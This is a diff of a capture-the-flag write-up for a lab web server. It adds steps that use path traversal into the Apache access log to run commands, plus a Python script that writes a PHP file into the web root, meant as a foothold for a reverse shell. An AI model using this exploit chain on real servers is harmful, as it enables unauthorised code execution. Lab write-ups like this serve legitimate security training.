@@ -305,7 +305,7 @@ http://10.10.43.88/?view=dog
 <img width="1917" height="655" alt="image" src="https://github.com/user-attachments/assets/de9e64ea-e606-4a96-8d69-e81751f4f0c4" />
 
 
-> ## try lfi
+> ## LFI
 
 ```
 http://10.10.43.88/?view=php://filter/resource=dog 
@@ -561,6 +561,89 @@ view-source:http://10.10.43.88/?view=dog/../../../../../../../../../var/log/apac
 
 
 <img width="1104" height="87" alt="image" src="https://github.com/user-attachments/assets/de4a279e-d4f8-437d-ae9c-81e79cb19fbe" />
+
+
+> ## pwd
+
+```
+http://10.10.106.210/?view=dog/../../../../../../../../../var/log/apache2/access.log&ext=&c=pwd
+```
+
+<img width="1448" height="115" alt="image" src="https://github.com/user-attachments/assets/d7fad5f4-d16c-4eae-a766-8f792973dc57" />
+
+> ## so if we can put file with reverse shell in this path we can access it form browser and get shell
+
+> ## test
+
+```python
+#!/usr/bin/env python3
+import requests
+import base64
+
+url = "http://10.10.106.210/"
+
+php_code = "<?php phpinfo(); ?>"   
+b64 = base64.b64encode(php_code.encode()).decode()
+
+
+cmd = f"echo {b64} | base64 -d > /var/www/html/test.php"
+
+params = {
+    "view": "dog/../../../../../../var/log/apache2/access.log",
+    "ext": "",
+    "c": cmd
+}
+
+r = requests.get(url, params=params, timeout=15)
+print("HTTP", r.status_code)
+print(r.text[:800])
+
+```
+
+```
+http://10.10.106.210/test.php
+```
+
+
+<img width="1344" height="805" alt="image" src="https://github.com/user-attachments/assets/697cead6-46d9-4887-ba7e-ff11a090389a" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
